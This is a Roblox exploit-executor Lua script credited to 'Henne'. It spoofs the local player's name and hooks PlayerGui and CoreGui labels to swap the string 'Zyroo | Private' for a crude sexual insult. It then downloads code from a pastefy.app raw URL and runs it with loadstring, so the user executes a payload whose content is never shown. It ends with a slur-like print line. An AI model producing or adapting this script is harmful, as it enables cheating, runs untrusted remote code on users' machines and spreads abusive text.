--[[
by Henne
Modified to replace "Zyroo | Private"
]]

local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local CoreGui = game:GetService("CoreGui")

local LocalPlayer = Players.LocalPlayer

-- Force change player name/display name
pcall(function()
    LocalPlayer.Name = "12345AB801"
    LocalPlayer.DisplayName = "12345AB801"
end)

-- Replacement function
local function patchText(text)
    if typeof(text) == "string" then
        if string.find(text, "Zyroo | Private", 1, true) then
            return string.gsub(text, "Zyroo | Private", "SLAYERSON Like big dick up his ass Uk!")
        end
    end
    return text
end

-- Apply patch to a single TextLabel, and hook changes
local function patchLabel(label)
    if label:IsA("TextLabel") then
        -- Patch existing
        label.Text = patchText(label.Text)
        -- Patch future changes
        label:GetPropertyChangedSignal("Text"):Connect(function()
            label.Text = patchText(label.Text)
        end)
    end
end

-- Patch environment strings
for k, v in pairs(getfenv()) do
    if typeof(v) == "string" then
        getfenv()[k] = patchText(v)
    end
end

-- Patch all existing labels in PlayerGui
local playerGui = LocalPlayer:WaitForChild("PlayerGui", 10)
for _, obj in ipairs(playerGui:GetDescendants()) do
    pcall(function() patchLabel(obj) end)
end
-- Hook for new labels in PlayerGui
playerGui.DescendantAdded:Connect(function(obj)
    pcall(function() patchLabel(obj) end)
end)

-- Patch all existing labels in CoreGui
for _, obj in ipairs(CoreGui:GetDescendants()) do
    pcall(function() patchLabel(obj) end)
end
-- Hook for new labels in CoreGui
CoreGui.DescendantAdded:Connect(function(obj)
    pcall(function() patchLabel(obj) end)
end)

-- Keep alive
RunService.Heartbeat:Connect(function() end)

-- Load extra code
pcall(function()
    local source = game:HttpGet("https://pastefy.app/mCTC42bW/raw")
    local func = loadstring(source)
    if func then
        func()
    end
end)

print("loaded nga")
